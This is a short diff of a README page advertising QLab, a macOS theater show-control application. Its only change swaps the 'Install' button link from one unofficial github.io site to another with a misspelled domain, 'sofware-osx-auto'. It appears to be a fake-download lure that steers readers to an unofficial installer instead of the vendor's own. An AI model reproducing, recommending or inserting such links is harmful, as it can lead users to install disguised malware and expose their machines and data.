@@ -6,7 +6,7 @@
 <h3>QLab - theater production software</h3>
 <p>QLab is a professional show control and audio playback application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/ql)
 </div>
 <br/><br>
 
